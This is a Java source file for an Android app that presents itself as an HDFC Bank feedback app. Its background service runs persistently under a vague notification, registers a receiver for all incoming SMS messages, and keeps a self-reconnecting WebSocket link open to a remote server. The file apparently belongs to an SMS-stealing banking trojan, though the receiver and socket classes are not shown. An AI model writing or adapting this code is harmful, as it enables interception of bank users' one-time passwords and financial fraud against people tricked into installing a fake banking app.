package com.feedback.hdfcbank01;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

public class BackgroundService extends Service {


    private static final String CHANNEL_ID = "MyServiceChannelFacebook";
    private SmsReceiver smsReceiver;
    private WebSocketManager webSocketManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForegroundService();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsReceiver = new SmsReceiver();
        registerReceiver(smsReceiver, filter);

        webSocketManager = new WebSocketManager(getApplicationContext());
        if(!webSocketManager.isConnected()){
            webSocketManager.connect();

            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            NetworkRequest networkRequest = new NetworkRequest.Builder().build();
            connectivityManager.registerNetworkCallback(networkRequest, new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(@NonNull Network network) {
                    reconnectWebSocket();
                }

                @Override
                public void onLost(@NonNull Network network) {
                    webSocketManager.closeConnection();
                }
            });
        }else{
            //Log.d(Helper.TAG, "onStartCommand : Not Connected");
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
//        //Log.d(Helper.TAG, "Foreground service destroyed");
        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
            smsReceiver = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        //Log.d(Helper.TAG, "onBind called - not used for started services");
        return null;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        //Log.d(Helper.TAG, "onUnbind called - service is being unbound");
        return super.onUnbind(intent);
    }

    @Override
    public void onRebind(Intent intent) {
        //Log.d(Helper.TAG, "onRebind called - service is being rebound");
        super.onRebind(intent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "SMS Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @SuppressLint("ForegroundServiceType")
    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Background Service")
                .setContentText("Listening for Background Service")
                .setContentIntent(pendingIntent)
                .build();
        startForeground(1, notification);
    }

    private void reconnectWebSocket() {
        new Handler().postDelayed(() -> {
            if (!webSocketManager.isConnected()) {
                webSocketManager = new WebSocketManager(getApplicationContext());
                webSocketManager.connect();
            }
        }, 3000);
    }

}
